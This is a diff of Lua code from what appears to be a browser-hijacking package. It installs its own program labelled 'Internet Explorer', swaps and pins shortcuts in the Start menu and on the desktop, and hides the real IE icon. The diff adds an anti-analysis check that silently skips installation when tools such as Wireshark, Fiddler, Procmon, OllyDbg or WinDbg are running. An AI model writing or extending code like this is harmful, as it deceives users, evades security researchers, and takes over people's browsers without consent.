@@ -467,7 +467,6 @@ function PopTipWnd(OnCreateFunc)
 end
 
 
-
 function ProcessCommandLine()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local bRet, strURL = FunctionObj.GetCommandStrValue("/openlink")
@@ -497,19 +496,37 @@ end
 ----------install ie ----------
 function TryInstallIE()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
+	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
+	if bRet and tostring(strSource) == "installfinish" then
+		return  --安装包来源 不执行
+	end	
+	
 	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
 	local nValue = FunctionObj.RegQueryValue(strRegFSPath)
 	if IsNilString(nValue) then 
-		return   --不是首次启动   
+		FunctionObj.TipLog("[TryInstallIE] no regie in register")
+		return   --注册表无标记   
 	end
 	
 	local strRegIEPath = "HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\Path"
 	local strIEPath = FunctionObj.RegQueryValue(strRegIEPath)
 	if IsRealString(strIEPath) then
-		return --已经安装  
+		FunctionObj.TipLog("[TryInstallIE] Has Installed IE")
+		return --已经安装
 	end
 	if not tipUtil:QueryFileExists(GetIEPath()) then
-		return   
+		FunctionObj.TipLog("[TryInstallIE] check IE path failed")
+		return --没有释放
+	end
+	
+	local tBlackList = {"wireshark", "fiddler", "httpanalyzer", "smsniff", "filemon", "regmon", "procmon", "windbg", "ollydbg", "softice", "devenv", "cis","tasklist","procexp","ollyice","processspy","spyxx","cv"} 
+	for _, strProcessName in pairs(tBlackList) do
+		local bExists = tipUtil:QueryProcessExists(strProcessName)
+		if bExists then
+			FunctionObj.TipLog("[TryInstallIE] blacklist process")
+			return --黑名单目录
+		end
 	end
 	
 	DoInstallIE()
@@ -714,47 +731,7 @@ function HideIEIco(bNeedHide)
 end
 
 
---开始菜单目录
-function WriteStartMenuSC()
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local nCSIDL_STARTMENU = 0xB
-	local nCSIDL_COMMON_STARTMENU = 0x16
-	local tStartMenuClsidl = {nCSIDL_STARTMENU, nCSIDL_COMMON_STARTMENU}
-
-	for _, nCsidl in pairs(tStartMenuClsidl) do
-		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
-		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
-			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
-			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
-			
-			if bIsInDir then
-				tipUtil:PinToStartMenu4XP(strCurrent, false)
-				--local bret = tipUtil:DeletePathFile(strCurrent)
-				CopyBackUpLnk(strCurrent,"STARTMENU")
-				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
-			end
-			
-			local strFilePath1 = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
-			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
-			if bIsInDir1 then
-				tipUtil:PinToStartMenu4XP(strCurrent1, false)
-				--local bret = tipUtil:DeletePathFile(strCurrent1)
-				CopyBackUpLnk(strCurrent1,"STARTMENU")
-				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
-			end
-			
-			local strIEPath = GetIEPath()
-			if nCsidl == nCSIDL_STARTMENU then
-				local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startbar", "启动 Internet Explorer 浏览器")
-				if bret then
-					tipUtil:PinToStartMenu4XP(strFilePath, true)
-				end
-			end	
-		end
-	end
-end
-
---开始菜单\程序\ 目录
+--开始菜单\程序\   目录
 function WriteStartMenuProgramSC()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local nCSIDL_COMMON_PROGRAM = 0x17
@@ -769,12 +746,14 @@ function WriteStartMenuProgramSC()
 			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir then
 				--local bret = tipUtil:DeletePathFile(strCurrent)
+				tipUtil:PinToStartMenu4XP(strCurrent, false)
 				CopyBackUpLnk(strCurrent,"SMPROGRAMS")
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
 			end
 			
 			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
 			if bIsInDir1 then
+				tipUtil:PinToStartMenu4XP(strCurrent1, false)
 				CopyBackUpLnk(strCurrent1,"SMPROGRAMS")
 				--local bret = tipUtil:DeletePathFile(strCurrent1)
 				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
@@ -783,6 +762,9 @@ function WriteStartMenuProgramSC()
 			local strIEPath = GetIEPath()
 			if nCsidl == nCSIDL_PROGRAM then
 				local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startmenuprograms", "启动 Internet Explorer 浏览器")
+				if bret then
+					tipUtil:PinToStartMenu4XP(strFilePath, true)
+				end
 			end	
 		end
 	end
@@ -858,18 +840,17 @@ function CreateDesktopShortCut()
 								.."  strSavePath: "..tostring(strSavePath))
 		
 			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
-				CreateDesktopSCDefault()
+				CreateDesktopReg()
 				return 
 			end
 			
 			local nDTType, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "dttype")
-						
 			if not bRet or tostring(nDTType) ~= "1" then
-				CreateDesktopSCDefault()
+				CreateDesktopReg()
 				return
 			end
 			
-			CreateDesktopReg()
+			CreateDesktopSCDefault()
 		end, 10*1000)
 end
 
